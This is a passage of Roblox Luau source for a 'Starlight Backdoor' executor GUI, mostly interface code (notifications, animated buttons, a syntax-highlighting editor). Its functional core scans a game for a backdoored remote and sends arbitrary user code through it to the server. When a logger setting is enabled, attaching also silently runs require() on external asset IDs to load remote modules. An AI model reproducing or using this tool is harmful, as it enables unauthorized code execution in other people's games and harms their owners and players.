	local ScanButton = ideContainer.buttons.inject
	local fr = UI.LOGO.Ring.Frame
	local status = fr.Injected
	local reset = ideContainer.buttons.reset
	local exe = ideContainer.buttons.execute
	local StarterGui = game:GetService("StarterGui")
	local HttpService = game:GetService("HttpService")
	local RemoteList = {} 
	local isFound = false
	local r6B = ideContainer.buttons.R6

	reset.MouseButton1Click:Connect(function()
		game.Players.LocalPlayer.Character.Humanoid.Health = 0
	end)

	local function getRemoteParents(remote)
		if not remote or not remote.Parent then
			return nil
		end

		local current = remote
		local path = {}

		while current and current ~= game do
			table.insert(path, 1, current.Name)
			current = current.Parent
		end

		return table.concat(path, ".")
	end

	local function Notification(notificationType, messageText)
		local function getNotificationType(nType)
			if nType == "Success" then
				return Color3.new(0, 1, 0)
			elseif nType == "Error" then
				return Color3.new(1, 0, 0)
			elseif nType == "Custom" then
				return Color3.new(0.976471, 0.733333, 0)
			end
		end
		local player = game:GetService("Players").LocalPlayer
		local TweenService = game:GetService("TweenService")
		local uicrn = Instance.new("UICorner")
		local container = player.PlayerGui:FindFirstChild("NotificationContainer")
		if not container then
			container = Instance.new("Frame")
			container.Name = "NotificationContainer"
			container.Parent = player.PlayerGui
			container.Size = UDim2.new(1, 0, 1, 0)
			container.BackgroundTransparency = 1
			container.Position = UDim2.new(0, 0, 0, 0)
		end
		task.wait(0.05)

		local function Checkframes()
			local count = 0
			for _, gui in ipairs(container:GetChildren()) do
				if gui:IsA("ScreenGui") and gui:GetAttribute("Active") then
					count += 1
				end
			end
			return count
		end
		local existing = Checkframes()

		local gui = Instance.new("ScreenGui")
		gui.Name = "SimpleNotify"
		gui.ResetOnSpawn = false
		gui.Parent = container
		gui:SetAttribute("Active", true) 

		local mainFrame = Instance.new("Frame")
		mainFrame.Name = "MainFrame"
		mainFrame.Parent = gui
		mainFrame.BackgroundColor3 = Color3.new(0, 0, 0)
		mainFrame.BackgroundTransparency = 0.15
		uicrn.Parent = mainFrame
		local offset = -80 - ((existing - 1) * 70) 
		mainFrame.Position = UDim2.new(1, 0, 1, offset)
		mainFrame.Size = UDim2.new(0, 260, 0, 60) 
		mainFrame.AnchorPoint = Vector2.new(1, 1) 

		local title = Instance.new("TextLabel")
		title.Name = "Title"
		title.Parent = mainFrame
		title.BackgroundTransparency = 1
		title.Position = UDim2.new(0, 12, 0, 8)
		title.Size = UDim2.new(1, -24, 0, 24)
		title.Font = Enum.Font.GothamBold
		title.Text = "Starlight Backdoor"
		title.TextColor3 = Color3.new(1, 1, 1)
		title.TextSize = 16
		title.TextXAlignment = Enum.TextXAlignment.Left

		local message = Instance.new("TextLabel")
		message.Name = "Message"
		message.Parent = mainFrame
		message.BackgroundTransparency = 1
		message.Position = UDim2.new(0, 12, 0, 32)
		message.Size = UDim2.new(1, -24, 0, 20)
		message.Font = Enum.Font.Gotham
		message.Text = messageText
		message.TextColor3 = Color3.new(0.8, 0.8, 0.8)
		message.TextSize = 14
		message.TextXAlignment = Enum.TextXAlignment.Left

		local greenBar = Instance.new("Frame")
		greenBar.Name = "GreenBar"
		greenBar.Parent = mainFrame
		greenBar.BackgroundColor3 = getNotificationType(notificationType)
		greenBar.Size = UDim2.new(1, 0, 0, 5)
		greenBar.Position = UDim2.new(0, 0, 1, -4)
		greenBar.BorderSizePixel = 0

		local uigrd = Instance.new("UIGradient", mainFrame)
		uigrd.Rotation = 132
		uigrd.Color = ColorSequence.new{
			ColorSequenceKeypoint.new(0.000, Color3.fromRGB(0, 27, 255)),
			ColorSequenceKeypoint.new(0.515, Color3.fromRGB(49, 49, 49)),
			ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 248, 0))
		}

		local greenBarUICorner = Instance.new("UICorner")
		greenBarUICorner.Parent = greenBar
		uicrn.CornerRadius = UDim.new(0, 5)

		local slideIn = TweenService:Create(
			mainFrame,
			TweenInfo.new(0.7, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
			{Position = UDim2.new(1, -20, 1, offset)}
		)

		slideIn:Play()

		local greenBarTween = TweenService:Create(
			greenBar,
			TweenInfo.new(2, Enum.EasingStyle.Linear),
			{Size = UDim2.new(0, 0, 0, 5)}
		)
		greenBarTween:Play()

		greenBarTween.Completed:Wait()

		local slideOut = TweenService:Create(
			mainFrame,
			TweenInfo.new(0.4, Enum.EasingStyle.Quad),
			{Position = UDim2.new(1, 300, 1, offset)}
		)
		slideOut:Play()

		slideOut.Completed:Wait()
		gui:SetAttribute("Active", false)
		gui:Destroy()
	end

	ScanButton.MouseButton1Click:Connect(function()
		local success, result = SB_AEGISRD.Attach()

		if success and result then
			local remoteParents = getRemoteParents(result.Remote)
			script.Parent.remotePath.Value = tostring(remoteParents)

			isFound = true
			ScanButton.Interactable = false
			status.Text = "Status: Attached"

			Notification("Success", string.format("Backdoor Found in %.6f sec!", result.Time))

			if script.Parent.Parent.UI.mainContainer.Settings.ScrollingFrame.Frame.gameLogger.TextButton.enb.Value then
				local s = "require(0x6F96419C6C7D).load('"..game.Players.LocalPlayer.Name.."')"
				SB_AEGISRD.Execute(s)
			end

			exe.Interactable = true

		else
			isFound = false
			Notification("Error", "No backdoor found.")
		end
	end)

	exe.MouseButton1Click:Connect(function()
		if isFound == false then
			Notification("Error", "Attach before executing!")
		end
	end)

	exe.MouseButton1Click:Connect(function()
		local s = Cody.Text
		SB_AEGISRD.Execute(s)
		Notification("Success", "Script successfully executed!")
	end)

	r6B.MouseButton1Click:Connect(function()
		SB_AEGISRD.Execute("require(3436957371):r6('" ..game.Players.LocalPlayer.Name.."')")
	end)

end;
task.spawn(C_a);
-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.buttonsContainer.UIGradient.LocalScript
local function C_12()
	local script = G2L["12"];
	while true do
		wait(0.1)
		script.Parent.Rotation += 1
	end
end;
task.spawn(C_12);
-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.buttonsContainer.bc2.HomeB.LocalScript
local function C_17()
	local script = G2L["17"];
	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.Parent.Parent.Home.Visible = not script.Parent.Parent.Parent.Parent.Home.Visible
		script.Parent.Parent.Parent.Parent.Executor.Visible = false
		script.Parent.Parent.Parent.Parent.ScriptHub.Visible = false
		script.Parent.Parent.Parent.Parent.Settings.Visible = false
	end)
end;
task.spawn(C_17);
-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.buttonsContainer.bc2.HomeB.anim
local function C_18()
	local script = G2L["18"];
	local TweenService = game:GetService("TweenService")

	local button = script.Parent
	local stroke = button:WaitForChild("UIStroke")

	-- BASE VALUES
	local normalBg = button.BackgroundColor3
	local normalStroke = stroke.Color

	-- EFFECT COLORS
	local hoverBg = normalBg:Lerp(Color3.new(0,0,0), 0.22)
	local pressBg = normalBg:Lerp(Color3.new(0,0,0), 0.32)

	-- POSITION (fake lift)
	local normalPos = button.Position
	local hoverPos = normalPos - UDim2.fromOffset(0, 2)
	local pressPos = normalPos + UDim2.fromOffset(0, 1)

	-- TWEENS
	local smooth = TweenInfo.new(0.2, Enum.EasingStyle.Quint, Enum.EasingDirection.Out)
	local fast = TweenInfo.new(0.08, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)

	local function tween(props, info)
		TweenService:Create(button, info or smooth, props):Play()
	end

	-- HOVER
	button.MouseEnter:Connect(function()
		tween({
			BackgroundColor3 = hoverBg,
			Position = hoverPos
		})
	end)

	-- LEAVE
	button.MouseLeave:Connect(function()
		tween({
			BackgroundColor3 = normalBg,
			Position = normalPos
		})
	end)

	-- CLICK
	button.MouseButton1Down:Connect(function()
		tween({
			BackgroundColor3 = pressBg,
			Position = pressPos
		}, fast)
	end)

	button.MouseButton1Up:Connect(function()
		tween({
			BackgroundColor3 = hoverBg,
			Position = hoverPos
		})
	end)

end;
task.spawn(C_18);
-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.buttonsContainer.bc2.ExecutorB.LocalScript
local function C_1c()
	local script = G2L["1c"];
	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.Parent.Parent.Home.Visible = false
		script.Parent.Parent.Parent.Parent.Executor.Visible = not script.Parent.Parent.Parent.Parent.Executor.Visible
		script.Parent.Parent.Parent.Parent.ScriptHub.Visible = false
		script.Parent.Parent.Parent.Parent.Settings.Visible = false
	end)
end;
task.spawn(C_1c);
-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.buttonsContainer.bc2.ExecutorB.anim
local function C_1d()
	local script = G2L["1d"];
	local TweenService = game:GetService("TweenService")

	local button = script.Parent
	local stroke = button:WaitForChild("UIStroke")

	-- BASE VALUES
	local normalBg = button.BackgroundColor3
	local normalStroke = stroke.Color

	-- EFFECT COLORS
	local hoverBg = normalBg:Lerp(Color3.new(0,0,0), 0.22)
	local pressBg = normalBg:Lerp(Color3.new(0,0,0), 0.32)

	-- POSITION (fake lift)
	local normalPos = button.Position
	local hoverPos = normalPos - UDim2.fromOffset(0, 2)
	local pressPos = normalPos + UDim2.fromOffset(0, 1)

	-- TWEENS
	local smooth = TweenInfo.new(0.2, Enum.EasingStyle.Quint, Enum.EasingDirection.Out)
	local fast = TweenInfo.new(0.08, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)

	local function tween(props, info)
		TweenService:Create(button, info or smooth, props):Play()
	end

	-- HOVER
	button.MouseEnter:Connect(function()
		tween({
			BackgroundColor3 = hoverBg,
			Position = hoverPos
		})
	end)

	-- LEAVE
	button.MouseLeave:Connect(function()
		tween({
			BackgroundColor3 = normalBg,
			Position = normalPos
		})
	end)

	-- CLICK
	button.MouseButton1Down:Connect(function()
		tween({
			BackgroundColor3 = pressBg,
			Position = pressPos
		}, fast)
	end)

	button.MouseButton1Up:Connect(function()
		tween({
			BackgroundColor3 = hoverBg,
			Position = hoverPos
		})
	end)

end;
task.spawn(C_1d);
-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.buttonsContainer.bc2.ScriptHubB.LocalScript
local function C_21()
	local script = G2L["21"];
	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.Parent.Parent.Home.Visible = false
		script.Parent.Parent.Parent.Parent.Executor.Visible = false
		script.Parent.Parent.Parent.Parent.ScriptHub.Visible = not script.Parent.Parent.Parent.Parent.ScriptHub.Visible
		script.Parent.Parent.Parent.Parent.Settings.Visible = false
	end)
end;
task.spawn(C_21);
-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.buttonsContainer.bc2.ScriptHubB.anim
local function C_22()
	local script = G2L["22"];
	local TweenService = game:GetService("TweenService")

	local button = script.Parent
	local stroke = button:WaitForChild("UIStroke")

	-- BASE VALUES
	local normalBg = button.BackgroundColor3
	local normalStroke = stroke.Color

	-- EFFECT COLORS
	local hoverBg = normalBg:Lerp(Color3.new(0,0,0), 0.22)
	local pressBg = normalBg:Lerp(Color3.new(0,0,0), 0.32)

	-- POSITION (fake lift)
	local normalPos = button.Position
	local hoverPos = normalPos - UDim2.fromOffset(0, 2)
	local pressPos = normalPos + UDim2.fromOffset(0, 1)

	-- TWEENS
	local smooth = TweenInfo.new(0.2, Enum.EasingStyle.Quint, Enum.EasingDirection.Out)
	local fast = TweenInfo.new(0.08, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)

	local function tween(props, info)
		TweenService:Create(button, info or smooth, props):Play()
	end

	-- HOVER
	button.MouseEnter:Connect(function()
		tween({
			BackgroundColor3 = hoverBg,
			Position = hoverPos
		})
	end)

	-- LEAVE
	button.MouseLeave:Connect(function()
		tween({
			BackgroundColor3 = normalBg,
			Position = normalPos
		})
	end)

	-- CLICK
	button.MouseButton1Down:Connect(function()
		tween({
			BackgroundColor3 = pressBg,
			Position = pressPos
		}, fast)
	end)

	button.MouseButton1Up:Connect(function()
		tween({
			BackgroundColor3 = hoverBg,
			Position = hoverPos
		})
	end)

end;
task.spawn(C_22);
-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.buttonsContainer.bc2.SettingsB.LocalScript
local function C_26()
	local script = G2L["26"];
	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.Parent.Parent.Home.Visible = false
		script.Parent.Parent.Parent.Parent.Executor.Visible = false
		script.Parent.Parent.Parent.Parent.ScriptHub.Visible = false
		script.Parent.Parent.Parent.Parent.Settings.Visible = not script.Parent.Parent.Parent.Parent.Settings.Visible
	end)
end;
task.spawn(C_26);
-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.buttonsContainer.bc2.SettingsB.anim
local function C_27()
	local script = G2L["27"];
	local TweenService = game:GetService("TweenService")

	local button = script.Parent
	local stroke = button:WaitForChild("UIStroke")

	-- BASE VALUES
	local normalBg = button.BackgroundColor3
	local normalStroke = stroke.Color

	-- EFFECT COLORS
	local hoverBg = normalBg:Lerp(Color3.new(0,0,0), 0.22)
	local pressBg = normalBg:Lerp(Color3.new(0,0,0), 0.32)

	-- POSITION (fake lift)
	local normalPos = button.Position
	local hoverPos = normalPos - UDim2.fromOffset(0, 2)
	local pressPos = normalPos + UDim2.fromOffset(0, 1)

	-- TWEENS
	local smooth = TweenInfo.new(0.2, Enum.EasingStyle.Quint, Enum.EasingDirection.Out)
	local fast = TweenInfo.new(0.08, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)

	local function tween(props, info)
		TweenService:Create(button, info or smooth, props):Play()
	end

	-- HOVER
	button.MouseEnter:Connect(function()
		tween({
			BackgroundColor3 = hoverBg,
			Position = hoverPos
		})
	end)

	-- LEAVE
	button.MouseLeave:Connect(function()
		tween({
			BackgroundColor3 = normalBg,
			Position = normalPos
		})
	end)

	-- CLICK
	button.MouseButton1Down:Connect(function()
		tween({
			BackgroundColor3 = pressBg,
			Position = pressPos
		}, fast)
	end)

	button.MouseButton1Up:Connect(function()
		tween({
			BackgroundColor3 = hoverBg,
			Position = hoverPos
		})
	end)

end;
task.spawn(C_27);
-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Executor.ideContainer.ideScroll.H_Handler
local function C_34()
	local script = G2L["34"];
	local inputBox = script.Parent:WaitForChild("ide")
	local highlightLabel = inputBox:WaitForChild("HLabel")

	highlightLabel.RichText = true
	highlightLabel.Font = inputBox.Font
	highlightLabel.TextSize = inputBox.TextSize
	highlightLabel.TextXAlignment = inputBox.TextXAlignment
	highlightLabel.TextYAlignment = inputBox.TextYAlignment
	highlightLabel.TextTransparency = 0
	highlightLabel.TextWrapped = inputBox.TextWrapped
	highlightLabel.ZIndex = inputBox.ZIndex - 1
	highlightLabel.ClipsDescendants = true
	inputBox.BackgroundTransparency = 1

	local wordsBLUE = {
		"new","Instance","print","pairs","ipairs","tonumber","tostring",
		"table.insert","table.remove","math.random","math.floor","math.ceil",
		"string.sub","string.find","string.gsub","string.match","string.len",
		"Color3","fromRGB","Vector3","Vector2","UDim2","Enum",
		"loadstring","getfenv","setfenv","script","game","workspace","tick","os.clock","coroutine.wrap",
		"require","warn","error","assert","spawn","delay","task.wait","task.delay",
		"HttpService","RunService","TweenService","UserInputService","Players","ReplicatedStorage",
		"Lighting","SoundService","MarketplaceService","TeleportService","DataStoreService"
	}
	local wordsRED = {
		"local","function","and","break","do","else","elseif","end","for",
		"if","in","not","or","repeat","until","return","then","while",
		"export","continue","next","type","typeof","self"
	}
	local wordsYELLOW = {"nil","true","false"}


	local allWords = {}
	for _, v in ipairs(wordsBLUE) do table.insert(allWords, {word = v, color = "0, 123, 255"}) end
	for _, v in ipairs(wordsRED) do table.insert(allWords, {word = v, color = "255, 52, 52"}) end
	for _, v in ipairs(wordsYELLOW) do table.insert(allWords, {word = v, color = "255, 255, 0"}) end

	table.sort(allWords, function(a, b) return #a.word > #b.word end)

	local function colorText(text)
		local definedFunctions = {}

		text = text:gsub('"(.-)"', function(innerText)
			return string.format('<font color="rgb(0, 255, 119)">"%s"</font>', innerText)
		end)

		text = text:gsub("function%s+(%w+)", function(funcName)
			definedFunctions[funcName] = true
			return string.format("function <font color='rgb(255, 255, 0)'>%s</font>", funcName)
		end)

		text = text:gsub(":(%s*%w+)", function(word)
			return string.format(":<font color='rgb(255, 255, 0)'>%s</font>", word)
		end)

		for _, entry in ipairs(allWords) do
			local w = entry.word
			local c = entry.color
			text = text:gsub("(%f[%w]"..w.."%f[%W])", string.format("<font color='rgb(%s)'>%s</font>", c, w))
		end

		for funcName in pairs(definedFunctions) do
			text = text:gsub("(%f[%w]"..funcName.."%f[%W])", string.format("<font color='rgb(255, 255, 0)'>%s</font>", funcName))
		end

		return text
	end

	local function updateHighlight()
		local text = inputBox.Text
		highlightLabel.Text = colorText(text)
	end

	inputBox:GetPropertyChangedSignal("Text"):Connect(updateHighlight)
	updateHighlight()

end;
task.spawn(C_34);
-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Executor.ideContainer.ideScroll.ide.size
local function C_36()
	local script = G2L["36"];
	local TextService = game:GetService("TextService")
	local textBox = script.Parent
	local scrollingFrame = textBox.Parent
	local nSF = textBox.Parent.Parent.numbersContainer

	local padding = 10

	local function updateCanvasSize()
		local font = textBox.Font
		if font == Enum.Font.Unknown then
			font = Enum.Font.SourceSans
		end

		local textBounds = TextService:GetTextSize(textBox.Text, textBox.TextSize, font, Vector2.new(10000, 10000))
		local canvasSize = textBounds.Y + padding
		scrollingFrame.CanvasSize = UDim2.new(0, 0, 0, canvasSize)
		nSF.CanvasSize = UDim2.new(0, 0, 0, canvasSize)
	end

	textBox:GetPropertyChangedSignal("Text"):Connect(updateCanvasSize)
	textBox:GetPropertyChangedSignal("Font"):Connect(updateCanvasSize)
	textBox:GetPropertyChangedSignal("TextSize"):Connect(updateCanvasSize)

	updateCanvasSize()
end;
task.spawn(C_36);
-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Executor.ideContainer.ideScroll.ide.numbers
local function C_37()
	local script = G2L["37"];
	local textBox = script.Parent
	local templateLabel = script.Parent.Parent.Parent.numbersContainer:FindFirstChild("tempate")
	local container = script.Parent.Parent.Parent:FindFirstChild("numbersContainer")

	assert(textBox, "TextBox not found in script.Parent")
	assert(templateLabel, "TemplateLabel not found in script.Parent")

	templateLabel.Visible = false

	local labels = {}
	local previousLineCount = 0

	local verticalSpacing = 3.35

	local function updateLabels()
		local currentLineCount = 1
		local _, count = string.gsub(textBox.Text, "\n", "")
		currentLineCount = count + 1

		if currentLineCount == previousLineCount then
			return
		end
		previousLineCount = currentLineCount

		for i = #labels, currentLineCount + 1, -1 do
			if labels[i] then
				labels[i]:Destroy()
				table.remove(labels, i)
			end
		end


		for i = #labels + 1, currentLineCount do
			local clone = templateLabel:Clone()
			clone.Position = templateLabel.Position
			clone.Name = tostring(i)
			clone.Text = tostring(i)
			clone.Visible = true

			clone.Position = UDim2.new(
				templateLabel.Position.X.Scale,
				templateLabel.Position.X.Offset,
				0,
				templateLabel.Position.Y.Offset + (i) * (templateLabel.Size.Y.Offset + verticalSpacing)
			)

			clone.Parent = container
			table.insert(labels, clone)
		end

		for i, lbl in ipairs(labels) do
			lbl.Text = tostring(i)
		end
	end

	textBox:GetPropertyChangedSignal("Text"):Connect(updateLabels)

	updateLabels()

end;
task.spawn(C_37);
-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Executor.ideContainer.ideScroll.ide.SrolSYNC
local function C_38()
	local script = G2L["38"];
	local scrollFrameA = script.Parent.Parent
	local scrollFrameB = script.Parent.Parent.Parent.numbersContainer

	local isSyncing = false

	local function onScrollFrameAScrolled()
		if isSyncing then return end
		isSyncing = true
		scrollFrameB.CanvasPosition = scrollFrameA.CanvasPosition
		isSyncing = false
	end

	local function onScrollFrameBScrolled()
		if isSyncing then return end
		isSyncing = true
		scrollFrameA.CanvasPosition = scrollFrameB.CanvasPosition
		isSyncing = false
	end

	scrollFrameA:GetPropertyChangedSignal("CanvasPosition"):Connect(onScrollFrameAScrolled)
	scrollFrameB:GetPropertyChangedSignal("CanvasPosition"):Connect(onScrollFrameBScrolled)
end;
task.spawn(C_38);
-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Executor.ideContainer.UIGradient.LocalScript
local function C_3e()
	local script = G2L["3e"];
	while true do
		wait(0.1)
		script.Parent.Rotation += 1
	end
end;
task.spawn(C_3e);
-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Executor.ideContainer.galaxyThemeGradient.LocalScript
local function C_42()
	local script = G2L["42"];
	while true do
		wait(0.1)
		script.Parent.Rotation += 1
	end
end;
task.spawn(C_42);
-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Executor.ideContainer.lunarThemeGradient.LocalScript
local function C_44()
	local script = G2L["44"];
	while true do
		wait(0.1)
		script.Parent.Rotation += 1
	end
end;
task.spawn(C_44);
-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Executor.ideContainer.buttons.erase.LocalScript
local function C_56()
	local script = G2L["56"];
	local TweenService = game:GetService("TweenService")
	local button = script.Parent

	local defaultIconColor = Color3.new(1, 1, 1)
	local hoverIconColor = Color3.fromRGB(237, 31, 31)

	local tweenInfo = TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)

	local function onHover()
		TweenService:Create(button, tweenInfo, {ImageColor3 = hoverIconColor}):Play()
	end

	local function onLeave()
		TweenService:Create(button, tweenInfo, {ImageColor3 = defaultIconColor}):Play()
	end

	button.ImageColor3 = defaultIconColor

	button.MouseEnter:Connect(onHover)
	button.MouseLeave:Connect(onLeave)

end;
task.spawn(C_56);
-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Executor.ideContainer.buttons.execute.LocalScript
local function C_58()
	local script = G2L["58"];
	local TweenService = game:GetService("TweenService")
	local button = script.Parent

	local defaultIconColor = Color3.new(1, 1, 1)
	local hoverIconColor = Color3.fromRGB(49, 206, 1)

	local tweenInfo = TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)

	local function onHover()
		TweenService:Create(button, tweenInfo, {ImageColor3 = hoverIconColor}):Play()
	end

	local function onLeave()
		TweenService:Create(button, tweenInfo, {ImageColor3 = defaultIconColor}):Play()
	end

	button.ImageColor3 = defaultIconColor

	button.MouseEnter:Connect(onHover)
	button.MouseLeave:Connect(onLeave)

end;
task.spawn(C_58);
-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Executor.ideContainer.buttons.hide.LocalScript
local function C_5a()
	local script = G2L["5a"];
	local TweenService = game:GetService("TweenService")
	local button = script.Parent

	local defaultIconColor = Color3.new(1, 1, 1)
	local hoverIconColor = Color3.fromRGB(237, 223, 30)

	local tweenInfo = TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)

	local function onHover()
		TweenService:Create(button, tweenInfo, {ImageColor3 = hoverIconColor}):Play()
	end

	local function onLeave()
		TweenService:Create(button, tweenInfo, {ImageColor3 = defaultIconColor}):Play()
	end

	button.ImageColor3 = defaultIconColor

	button.MouseEnter:Connect(onHover)
	button.MouseLeave:Connect(onLeave)

end;
task.spawn(C_5a);
-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Executor.ideContainer.buttons.inject.LocalScript
local function C_5f()
	local script = G2L["5f"];
	local TweenService = game:GetService("TweenService")
	local button = script.Parent

	local defaultIconColor = Color3.new(1, 1, 1)
	local hoverIconColor = Color3.fromRGB(26, 30, 237)

	local tweenInfo = TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)

	local function onHover()
		TweenService:Create(button, tweenInfo, {ImageColor3 = hoverIconColor}):Play()
	end

	local function onLeave()
		TweenService:Create(button, tweenInfo, {ImageColor3 = defaultIconColor}):Play()
	end

	button.ImageColor3 = defaultIconColor

	button.MouseEnter:Connect(onHover)
	button.MouseLeave:Connect(onLeave)

end;
task.spawn(C_5f);
-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Executor.ideContainer.buttons.saveScript.LocalScript
local function C_61()
	local script = G2L["61"];
	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.Parent.saveScriptFrame.Visible = true
	end)
end;
task.spawn(C_61);
-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Executor.ideContainer.buttons.saveScript.LocalScript
local function C_62()
	local script = G2L["62"];
	local TweenService = game:GetService("TweenService")
	local button = script.Parent

	local defaultIconColor = Color3.new(1, 1, 1)
	local hoverIconColor = Color3.fromRGB(221, 0, 237)

	local tweenInfo = TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)

	local function onHover()
		TweenService:Create(button, tweenInfo, {ImageColor3 = hoverIconColor}):Play()
	end

	local function onLeave()
		TweenService:Create(button, tweenInfo, {ImageColor3 = defaultIconColor}):Play()
	end

	button.ImageColor3 = defaultIconColor

	button.MouseEnter:Connect(onHover)
	button.MouseLeave:Connect(onLeave)

end;
task.spawn(C_62);
-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Executor.savedScriptsContainer.saveScriptSystem
local function C_6c()
	local script = G2L["6c"];
	local buttonNameTextBox = script.Parent.Parent.ideContainer.saveScriptFrame.scriptName.TextBox
	local scriptContentTextBox = script.Parent.Parent.ideContainer.ideScroll.ide
	local buttonsContainer = script.Parent.ScrollingFrame

	local function Notification(notificationType, messageText)
		local function getNotificationType(nType)
			if nType == "Success" then
				return Color3.new(0, 1, 0)
			elseif nType == "Error" then
				return Color3.new(1, 0, 0)
			elseif nType == "Custom" then
				return Color3.new(0.976471, 0.733333, 0)
			end
		end
		local player = game:GetService("Players").LocalPlayer
		local TweenService = game:GetService("TweenService")
		local uicrn = Instance.new("UICorner")
		local container = player.PlayerGui:FindFirstChild("NotificationContainer")
		if not container then
			container = Instance.new("Frame")
			container.Name = "NotificationContainer"
			container.Parent = player.PlayerGui
			container.Size = UDim2.new(1, 0, 1, 0)
			container.BackgroundTransparency = 1
			container.Position = UDim2.new(0, 0, 0, 0)
		end
		task.wait(0.05)

		local function Checkframes()
			local count = 0
			for _, gui in ipairs(container:GetChildren()) do
				if gui:IsA("ScreenGui") and gui:GetAttribute("Active") then
					count += 1
				end
			end
			return count
		end
		local existing = Checkframes()

		local gui = Instance.new("ScreenGui")
		gui.Name = "SimpleNotify"
		gui.ResetOnSpawn = false
		gui.Parent = container
		gui:SetAttribute("Active", true) 

		local mainFrame = Instance.new("Frame")
		mainFrame.Name = "MainFrame"
		mainFrame.Parent = gui
		mainFrame.BackgroundColor3 = Color3.new(0, 0, 0)
		mainFrame.BackgroundTransparency = 0.15
		uicrn.Parent = mainFrame
		local offset = -80 - ((existing - 1) * 70) 
		mainFrame.Position = UDim2.new(1, 0, 1, offset)
		mainFrame.Size = UDim2.new(0, 260, 0, 60) 
		mainFrame.AnchorPoint = Vector2.new(1, 1) 

		local title = Instance.new("TextLabel")
		title.Name = "Title"
		title.Parent = mainFrame
		title.BackgroundTransparency = 1
		title.Position = UDim2.new(0, 12, 0, 8)
		title.Size = UDim2.new(1, -24, 0, 24)
		title.Font = Enum.Font.GothamBold
		title.Text = "Starlight Backdoor"
		title.TextColor3 = Color3.new(1, 1, 1)
		title.TextSize = 16
		title.TextXAlignment = Enum.TextXAlignment.Left

		local message = Instance.new("TextLabel")
		message.Name = "Message"
		message.Parent = mainFrame
		message.BackgroundTransparency = 1
		message.Position = UDim2.new(0, 12, 0, 32)
		message.Size = UDim2.new(1, -24, 0, 20)
		message.Font = Enum.Font.Gotham
		message.Text = messageText
		message.TextColor3 = Color3.new(0.8, 0.8, 0.8)
		message.TextSize = 14
		message.TextXAlignment = Enum.TextXAlignment.Left

		local greenBar = Instance.new("Frame")
		greenBar.Name = "GreenBar"
		greenBar.Parent = mainFrame
		greenBar.BackgroundColor3 = getNotificationType(notificationType)
		greenBar.Size = UDim2.new(1, 0, 0, 5)
		greenBar.Position = UDim2.new(0, 0, 1, -4)
		greenBar.BorderSizePixel = 0

		local uigrd = Instance.new("UIGradient", mainFrame)
		uigrd.Rotation = 132
		uigrd.Color = ColorSequence.new{
			ColorSequenceKeypoint.new(0.000, Color3.fromRGB(0, 27, 255)),
			ColorSequenceKeypoint.new(0.515, Color3.fromRGB(49, 49, 49)),
			ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 248, 0))
		}

		local greenBarUICorner = Instance.new("UICorner")
		greenBarUICorner.Parent = greenBar
		uicrn.CornerRadius = UDim.new(0, 5)

		local slideIn = TweenService:Create(
			mainFrame,
			TweenInfo.new(0.7, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
			{Position = UDim2.new(1, -20, 1, offset)}
		)

		slideIn:Play()

		local greenBarTween = TweenService:Create(
			greenBar,
			TweenInfo.new(2, Enum.EasingStyle.Linear),
			{Size = UDim2.new(0, 0, 0, 5)}
		)
		greenBarTween:Play()

		greenBarTween.Completed:Wait()

		local slideOut = TweenService:Create(
			mainFrame,
			TweenInfo.new(0.4, Enum.EasingStyle.Quad),
			{Position = UDim2.new(1, 300, 1, offset)}
		)
		slideOut:Play()

		slideOut.Completed:Wait()
		gui:SetAttribute("Active", false)
		gui:Destroy()
	end

	local function ensureScriptsFolder()
		if not game:GetService("ReplicatedStorage"):FindFirstChild("SavedScripts") then
			local folder = Instance.new("Folder")
			folder.Name = "SavedScripts"
			folder.Parent = game:GetService("ReplicatedStorage")
		end
	end

	ensureScriptsFolder()

	local savedScripts = {}
	local buttonSpacing = -12
	local buttonHeight = 26
	local initialXScale = 0.073
	local initialYScale = 0.01
	local buttonWidth = 161

	local function createStyledButton(buttonName, scriptContent, buttonIndex)
		local buttonContainer = Instance.new("Frame")
